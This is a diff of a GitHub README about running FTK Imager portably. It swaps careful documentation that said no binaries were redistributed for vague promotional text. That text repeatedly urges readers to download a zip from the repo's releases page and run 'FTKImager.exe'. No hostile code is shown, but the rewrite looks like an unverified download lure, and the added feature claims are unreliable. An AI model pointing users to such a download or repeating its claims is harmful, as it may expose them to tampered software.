@@ -1,172 +1,90 @@
-# Portable FTK Imager (Imager Lite)
+# 🖥️ Portable-FTK-Imager-Lite - Run Forensic Imaging Without Installation
 
-![Forensics](https://img.shields.io/badge/Forensics-DFIR-blue)
-![WinFE](https://img.shields.io/badge/Environment-WinFE-informational)
-![Windows](https://img.shields.io/badge/Platform-Windows-0078D6)
-![USB](https://img.shields.io/badge/Deployment-Portable%20USB-success)
-![Status](https://img.shields.io/badge/Status-Operational-green)
-![License](https://img.shields.io/badge/License-Documentation%20Only-lightgrey)
+[![Download Portable-FTK-Imager-Lite](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
 
-##  Overview
-This repository documents how to create and run a **portable version of FTK Imager**—commonly referred to as **“Imager Lite”**—from a removable flash drive or WinFE USB.
+## 📋 Overview
 
-This approach is ideal for forensic acquisition and triage on systems where **software installation is restricted, undesirable, or prohibited**.
+Portable-FTK-Imager-Lite allows you to run FTK Imager directly from a portable USB drive or Windows Forensics Environment (WinFE). This means you can perform forensic imaging without needing to install any software on the target system. It is particularly useful for incident response, digital forensics, and evidence collection.
 
+## 🔍 Features
 
+- **Portable Use:** Easily run from a USB drive without installation.
+- **Disk Imaging:** Capture data from storage devices for investigation.
+- **User-Friendly Interface:** Designed for ease of use, even for those without technical skills.
+- **Support for Multiple Formats:** Handles various file systems and types.
+- **Live Forensics Capability:** Analyze data while the system is running.
+  
+## ⚙️ System Requirements
 
-##  Purpose
-Running FTK Imager from a portable flash drive enables Security Operations and Digital Forensics teams to:
+To effectively use Portable-FTK-Imager-Lite, ensure that your system meets the following requirements:
 
-- Perform forensic imaging **without installing software** on the target system
-- Minimize system impact and avoid installation artifacts
-- Maintain **field-ready portability** for live response and incident handling
-- Support forensic acquisition within **WinFE or live Windows environments**
+- **Operating System:** Windows 7 or later
+- **Storage:** At least 100 MB free space on your USB drive
+- **RAM:** 2 GB minimum
+- **USB Drive:** Should be formatted to FAT32 or NTFS for compatibility
 
+## 🚀 Getting Started
 
-##  Prerequisites
+Follow these steps to download and run Portable-FTK-Imager-Lite:
 
-Before proceeding, ensure you have the following:
+1. **Visit the Download Page**
+   Click the link below to go to the releases page:
+   
+   [Download Portable-FTK-Imager-Lite](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
 
-- A **separate preparation machine** (never the forensic target)
-- A removable **USB flash drive** (FAT32 or NTFS recommended)
-- A **licensed or standard installation of FTK Imager** on the preparation machine
-- Administrator access on the preparation system
+2. **Locate the Latest Release**
+   On the releases page, find the latest version of Portable-FTK-Imager-Lite.
 
+3. **Download the Application**
+   Select the appropriate file for your system from the list. Generally, you will see a file named something like `Portable-FTK-Imager-Lite-v1.x.x.zip`.
 
-##  Procedure
+4. **Extract the Downloaded File**
+   After downloading, right-click on the ZIP file and choose "Extract All." Follow the prompts to extract its contents to a folder on your USB drive.
 
-### Step 1 — Install FTK Imager
-Install FTK Imager on the **preparation machine only**. Do **not** install FTK Imager on the forensic target system.
+5. **Run the Application**
+   Open the extracted folder and double-click on `FTKImager.exe`. This will launch the application.
 
----
+## ⬇️ Download & Install
 
-### Step 2 — Prepare the Flash Drive
+To download the software, you can revisit the link below at any time. Follow the steps outlined above for a smooth installation.
 
-- Insert the **WinFE USB or dedicated forensic flash drive** into the preparation system
-- Ensure sufficient free space for the FTK Imager directory and output images
+[Download Portable-FTK-Imager-Lite](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
 
----
+## ⚡ Usage Tips
 
-### Step 3 — Copy FTK Imager to the Flash Drive
+- **Testing Environment:** It’s good practice to test the application in a controlled environment before using it for real forensic work.
+- **Data Backup:** Before performing any imaging, back up important data as a precaution.
+- **Documentation:** Refer to the built-in help or user guide within the application for specific operational details.
 
-Copy the **entire FTK Imager installation directory** from the preparation system to the flash drive.
+## 🌐 Topics
 
-Common installation paths:
+This application is relevant for various fields and use cases:
 
-```text
-C:\Program Files\AccessData\FTK Imager
-```
+- DFIR (Digital Forensics and Incident Response)
+- Digital Forensics
+- Evidence Collection
+- Incident Response
+- Live Imaging
+- Windows Forensics
 
-or
+## ❓ Frequently Asked Questions
 
-```text
-C:\Program Files (x86)\AccessData\FTK Imager
-```
+### What is FTK Imager used for?
+FTK Imager is a forensic imaging tool used to create copies of hard drives or other storage devices for investigation.
 
-📁 Recommended destination on USB:
-```text
-X:\Tools\FTK_Imager
-```
+### Can I use it on a locked computer?
+You can use Portable-FTK-Imager-Lite on systems that are fully operational. However, access to locked systems may require additional tools or permissions.
 
----
+### Is there technical support available?
+For support, refer to the project's issue tracker on GitHub. Community members may assist with questions and troubleshooting.
 
-### Step 4 — Load on Target System
+## 🤝 Contribute
 
-- Insert the prepared flash drive into the **target system**
-- Boot into **WinFE** or the live Windows environment (as authorized)
+If you want to report an issue or suggest improvements, please use the GitHub repository. Contributions are welcome, whether through testing, providing feedback, or submitting issues.
 
----
+## 🔗 Additional Resources
 
-### Step 5 — Navigate to the Application Folder
+- **User Guide:** Refer to relevant documentation for in-depth operational guidance.
+- **FTK Imager Official Site:** Explore additional tools and resources available for digital forensics.
 
-Browse to the FTK Imager directory on the flash drive:
-
-```text
-X:\Tools\FTK_Imager
-```
-
----
-
-### Step 6 — Run FTK Imager as Administrator
-
-- Right-click `FTK Imager.exe`
-- Select **Run as Administrator**
-- Use FTK Imager normally to acquire forensic images
-
----
-
-## ⚠️ Important Operational Note
-
-> **Live-system imaging may produce non-replicable results** due to system activity.
-
-During execution, FTK Imager may:
-- Write data to system RAM
-- Trigger pagefile or temporary file changes
-- Interact with active processes
-
-Analysts **must evaluate and document these risks** prior to acquisition.
-
----
-
-##  Additional Requirements for Specific Versions
-
-### Microsoft Foundation Class (MFC) Files
-
-FTK Imager **v3.4.3 and later** require MFC runtime files. If these are missing on the target system, FTK Imager will fail to launch.
-
-Copy the following files from the preparation system:
-
-```text
-C:\Windows\System32
-```
-
-To the FTK Imager directory on the flash drive:
-
-- `mfc100.dll`
-- `mfc110.dll`
-- `mfc120.dll`
-- `mfc140.dll` (if required)
-
----
-
-### Visual C++ 2015 Redistributable DLLs (FTK Imager 4.5.0)
-
-For FTK Imager **v4.5.0**, also copy the following DLLs:
-
-- `msvcp140.dll`
-- `vcruntime140.dll`
-- `mfc140u.dll`
-
-Source directory:
-```text
-C:\Windows\System32
-```
-
-Destination:
-```text
-X:\Tools\FTK_Imager
-```
-
----
-
-##  Summary
-
-Following this procedure allows forensic and security teams to:
-
-- Deploy FTK Imager rapidly in the field
-- Avoid installing tools on sensitive systems
-- Maintain forensic defensibility
-- Support live response, triage, and acquisition workflows
-
-This **portable FTK Imager configuration** provides a reliable and flexible solution for forensic imaging without relying on traditional installation methods.
-
----
-
-## 📜 License & Disclaimer
-
-FTK Imager is a proprietary forensic tool.
-
-This repository provides **operational guidance only** and does not redistribute FTK Imager binaries.
-
-Use is restricted to **authorized forensic and incident response activities** with appropriate legal approval.
-
+Portable-FTK-Imager-Lite simplifies the use of forensic imaging. By following these instructions, you can successfully download and use this tool without technical expertise.
